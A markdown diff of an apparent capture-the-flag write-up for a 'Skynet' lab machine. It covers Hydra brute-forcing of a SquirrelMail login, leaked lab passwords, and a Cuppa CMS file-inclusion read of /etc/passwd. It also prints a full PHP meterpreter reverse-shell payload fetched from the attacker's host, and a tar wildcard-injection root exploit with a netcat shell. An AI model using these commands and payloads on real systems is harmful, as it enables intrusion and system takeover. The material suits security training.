@@ -170,15 +170,12 @@ There are multiple ways to directory enumeration all do the same thing
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHot3BsCzbXwUS4B2xr%2F-MHotIApuuEzmWtuzWsu%2FScreen%20Shot%202020-09-22%20at%203.18.45%20AM.png?alt=media&token=5f13b0bc-d486-42f6-b586-a101787511cd)
 
-Gobuster
 
 Navigating to the **http://IP/squirrelmail** account we see that there is a username and password field.
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHotgV-c5OnKhPouS_l%2F-MHou6i-PgzIsoGNfbfq%2FScreen%20Shot%202020-09-22%20at%203.22.24%20AM.png?alt=media&token=f11b8bfc-fe7c-40fd-b7c1-7294983d8a38)
 
-Squirrel Mail login
-
-Bruteforce password[](#bruteforce-password)
+## Bruteforce password[](#bruteforce-password)
 
 ===============================================
 
@@ -192,63 +189,56 @@ There are 3 common ways to bruteforce passwords for websites
 
 3.  **Manual trial and error**
 
-You can also use BurpSuite to bruteforce the web-app password by using the sniper feature
+>You can also use BurpSuite to bruteforce the web-app password by using the sniper feature
 
-###
 
-Hydra[](#hydra)
 
-hydra -l milesdyson -P log1.txt 10.10.XX.XXX http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=0&just_logged_in=1:password incorrect"
+### Hydra[](#hydra)
 
--l --> only one username
+>hydra -l milesdyson -P log1.txt 10.10.XX.XXX http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=0&just_logged_in=1:password incorrect"
+>
+>-l --> only one username
+>
+>-P --> list of passwords (keept it in the same directory)
+>
+>10.10.XX.XXX --> IP address
+>
+>http-post-form --> only used whenever you have a login page
+>
+>squirrelmail/src/redirect.php --> this is the URL whenever the default username and password fails
+>
+>login_username --> This is the name of the username field which we find in page source of login page
+>
+>^USER^ --> This will take the username in -l
+>
+>secretkey --> This is the name of the password field in which we find in page source of login page
+>
+>^PASS^ --> This will take the password in -P
+>
+>js_autodetect_results=0 --> This can be found in the password field which will detect if the username and password is correct
+>
+>just_logged_in=1 --> This can be found in the password field which will locate if the account gets logged in
+>
+>password incorrect --> This is what you see if the username and password is incorrect
 
--P --> list of passwords (keept it in the same directory)
-
-10.10.XX.XXX --> IP address
-
-http-post-form --> only used whenever you have a login page
-
-squirrelmail/src/redirect.php --> this is the URL whenever the default username and password fails
-
-login_username --> This is the name of the username field which we find in page source of login page
-
-^USER^ --> This will take the username in -l
-
-secretkey --> This is the name of the password field in which we find in page source of login page
-
-^PASS^ --> This will take the password in -P
-
-js_autodetect_results=0 --> This can be found in the password field which will detect if the username and password is correct
-
-just_logged_in=1 --> This can be found in the password field which will locate if the account gets logged in
-
-password incorrect --> This is what you see if the username and password is incorrect
-
-###
-
-BurpSuite[](#burpsuite)
+### BurpSuite[](#burpsuite)
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHotgV-c5OnKhPouS_l%2F-MHp4atZjZzyUXo_EFE2%2FScreen%20Shot%202020-09-22%20at%203.34.30%20AM.png?alt=media&token=e965d532-9673-4bea-bc1e-4d87f0493c93)
 
-Password cracking via Sniper in Burp
 
-Username: milesdyson
+>Username: milesdyson
+>
+>Password: cyborg007haloterminator
 
-Password: cyborg007haloterminator
-
-###
-
-Login to SquirrelMail[](#login-to-squirrelmail)
+### Login to SquirrelMail[](#login-to-squirrelmail)
 
 We find the SMB password in one of the emails
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHotgV-c5OnKhPouS_l%2F-MHpFE0mSMkt5AuisJfh%2FScreen%20Shot%202020-09-22%20at%204.59.08%20AM.png?alt=media&token=e967ce98-3657-4b87-bae3-c70c905ae486)
 
-Squirrel Mail Email
+>SMB password from email: )s{A&2Z=F^n_E.B`
 
-SMB password from email: )s{A&2Z=F^n_E.B`
-
-Further Enumeration[](#further-enumeration)
+## Further Enumeration[](#further-enumeration)
 
 ===============================================
 
@@ -258,9 +248,7 @@ Using the password from the SMB email we can use smbmap to confirm if the shares
 
 SMBmap with correct password
 
-###
-
-Mounting the shared drives using password[](#mounting-the-shared-drives-using-password)
+### Mounting the shared drives using password[](#mounting-the-shared-drives-using-password)
 
 By now you should be proficient in mounting drives using smbclient and CIFS. I will be using CIFS(above) moving forward.
 
@@ -272,21 +260,17 @@ We can navigate to the important.txt file which is in the notes directory using 
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHpFYplbIchDWMkE0DE%2F-MHpP9FwbRKk0VVh0UNg%2FScreen%20Shot%202020-09-22%20at%205.41.34%20AM.png?alt=media&token=ccd9efbb-aa8e-4514-b993-2c36156cb273)
 
-important.txt
-
 Navigating to the hidden drive http://10.10.37.86/45kra24zxs28v3yd we find miles dyson
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHpFYplbIchDWMkE0DE%2F-MHpQ66wr-GPDNdyS19p%2FScreen%20Shot%202020-09-22%20at%205.46.41%20AM.png?alt=media&token=0ad9332c-d99c-4d99-9e69-220c2210cf6e)
 
-CuppaCMS[](#cuppacms)
+## CuppaCMS[](#cuppacms)
 
 =========================
 
 Gobusting the URL we find a hidden admin page for cuppa CMS
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHpSGUmbAfqm06gVdLo%2F-MHpSuMC50Bh3PM3Y30c%2FScreen%20Shot%202020-09-22%20at%205.58.46%20AM.png?alt=media&token=b3e156f0-d1a7-41c4-998b-f29af013e7ac)
-
-Hidden Administrator page
 
 Using searchsploit we find that vulnerability of Local/Remote File Inclusion exists for Cuppa CMS.
 
@@ -306,13 +290,13 @@ The following are the LFI vulnerabilities
 
 So trying that in our system we can replace target with IP and delete the directory cuppa.
 
-http://10.10.37.86/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+>http://10.10.37.86/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 
 ![](https://gblobscdn.gitbook.com/assets%2F-MHmxyKNNtS8Klt7zSC7%2F-MHpUoLwtrspcv-lgc_U%2F-MHpWU_r2swnsSLxlW7i%2FScreen%20Shot%202020-09-22%20at%206.14.36%20AM.png?alt=media&token=c1de95ae-7b98-4038-97da-fc00294b3f31)
 
 NT password file
 
-User Level Shell[](#user-level-shell)
+## User Level Shell[](#user-level-shell)
 
 =========================================
 
@@ -322,51 +306,51 @@ Creating a reverse shell can be achieved via 2 methods
 
 2.  Netcat
 
-Metasploit method[](#metasploit-method)
+### Metasploit method[](#metasploit-method)
 
 -------------------------------------------
 
 Run the following commands
 
-msfdb run
-
-use exploit/multi/handler
-
-search php type:payload
-
-set payload php/meterpreter/reverse_tcp
-
-set LHOST tun0
-
-set LPORT 4444
-
-set exitonsession false
-
-run
-
-Or
-
-exploit -j ----> to run session in background
-
-jobs -v -----> to show all the jobs
+>msfdb run
+>
+>use exploit/multi/handler
+>
+>search php type:payload
+>
+>set payload php/meterpreter/reverse_tcp
+>
+>set LHOST tun0
+>
+>set LPORT 4444
+>
+>set exitonsession false
+>
+>run
+>
+>Or
+>
+>exploit -j ----> to run session in background
+>
+>jobs -v -----> to show all the jobs
 
 Generate payload
 
-msfvenom -p php/meterpreter/reverse_tcp LHOST=10.2.35.24 LPORT=4444 -f raw > terminator.php
+>msfvenom -p php/meterpreter/reverse_tcp LHOST=10.2.35.24 LPORT=4444 -f raw > terminator.php
 
 Once the PHP payload is created you need to comment the PHP in the beginning and close the php tag in the end
 
-<?php  /**/  error_reporting(0);  $ip  =  '10.2.35.24';  $port  =  4444;  if  (($f  =  'stream_socket_client')  &&  is_callable($f))  {  $s  =  $f("tcp://{$ip}:{$port}");  $s_type  =  'stream';  }  if  (!$s  &&  ($f  = 'fsockopen')  &&  is_callable($f))  {  $s  =  $f($ip,  $port);  $s_type  = 'stream';  }  if  (!$s  &&  ($f  = 'socket_create')  &&  is_callable($f))  {  $s  =  $f(AF_INET,  SOCK_STREAM,  SOL_TCP);  $res  = @socket_connect($s,  $ip,  $port);  if  (!$res)  {  die();  }  $s_type  = 'socket';  }  if  (!$s_type)  {  die('no socket funcs');  }  if  (!$s)  {  die('no socket');  }  switch  ($s_type)  {  case 'stream':  $len  =  fread($s,  4);  break;  case 'socket':  $len  =  socket_read($s,  4);  break;  }  if  (!$len)  {  die();  }  $a  =  unpack("Nlen",  $len);  $len  =  $a['len'];  $b  = '';  while  (strlen($b)  <  $len)  {  switch  ($s_type)  {  case 'stream':  $b  .=  fread($s,  $len-strlen($b));  break;  case 'socket':  $b  .=  socket_read($s,  $len-strlen($b));  break;  }  }  $GLOBALS['msgsock']  =  $s;  $GLOBALS['msgsock_type']  =  $s_type;  if  (extension_loaded('suhosin')  &&  ini_get('suhosin.executor.disable_eval'))  {  $suhosin_bypass=create_function('',  $b);  $suhosin_bypass();  }  else  {  eval($b);  }  die();?>
+><?php  /**/  error_reporting(0);  $ip  =  '10.2.35.24';  $port  =  4444;  if  (($f  =  'stream_socket_client')  &&  is_callable($f))  {  $s  =  $f("tcp://{$ip}:{$port}");  $s_type  =  'stream';  }  if  (!$s  &&  ($f  = 'fsockopen')  &&  is_callable($f))  {  $s  =  $f($ip,  $port);  $s_type  = 'stream';  }  if  (!$s  &&  ($f  = 'socket_create')  &&  is_callable($f))  {  $s  =  $f(AF_INET,  SOCK_STREAM,  SOL_TCP);  $res  = @socket_connect($s,  $ip,  $port);  if  (!$res)  {  die();  }  $s_type  = 'socket';  }  if  (!$s_type)  {  die('no socket funcs');  }  if  (!$s)  {  die('no socket');  }  switch  ($s_type)  {  case 'stream':  $len  =  fread($s,  4);  break;  case 'socket':  $len  =  socket_read($s,  4);  break;  }  if  (!$len)  {  die();  }  $a  =  unpack("Nlen",  $len);  $len  =  $a['len'];  $b  = '';  while  (strlen($b)  <  $len)  {  switch  ($s_type)  {  case 'stream':  $b  .=  fread($s,  $len-strlen($b));  break;  case 'socket':  $b  .=  socket_read($s,  $len-strlen($b));  break;  }  }  $GLOBALS['msgsock']  =  $s;  $GLOBALS['msgsock_type']  =  $s_type;  if  (extension_loaded('suhosin')  &&  ini_get('suhosin.executor.disable_eval'))  {  $suhosin_bypass=create_function('',  $b);  $suhosin_bypass();  }  else  {  eval($b);  }  die();?>
 
 Setup the python simple http server
 
-python3 -m 'http.server'
+>python3 -m 'http.server'
 
 Executing the php in the browser to gain session
 
-10.10.37.86/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.2.35.24:8000/terminator.php?
+>10.10.37.86/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.2.35.24:8000/terminator.php?
 
-Netcat Method[](#netcat-method)
+### Netcat Method[](#netcat-method)
 
 -----------------------------------
 
@@ -380,7 +364,7 @@ Netcat Method[](#netcat-method)
 
 -   Execute the link above
 
-Privilege Escalation[](#privilege-escalation)
+##Privilege Escalation[](#privilege-escalation)
 
 =================================================
 
@@ -408,21 +392,21 @@ Doing a bit of google search with "[tar privilege escalation](https://www.hackin
 
 Following Tar Wildcard Injection Method 1
 
-msfvenom -p cmd/unix/reverse_netcat lhost=<YOURIP> lport=4444 R
+>msfvenom -p cmd/unix/reverse_netcat lhost=<YOURIP> lport=4444 R
 
-Create a nc session in a different window to catch the root shell
-
-nc -nlvp 4444
+>Create a nc session in a different window to catch the root shell
+>
+>nc -nlvp 4444
 
 Navigate to /var/www/html and input the commands as follows
 
-echo "<YOUR  MSFVENOM  CODE  GOES  HERE"  > shell.sh
-
-echo "" > "--checkpoint-action=exec=sh shell.sh"
-
-echo "" > --checkpoint=1
-
-tar cf archive.tar *
+>echo "<YOUR  MSFVENOM  CODE  GOES  HERE"  > shell.sh
+>
+>echo "" > "--checkpoint-action=exec=sh shell.sh"
+>
+>echo "" > --checkpoint=1
+>
+>tar cf archive.tar *
 
 Now you have the root shell as root@skynet along with our shell.sh file which we created
 
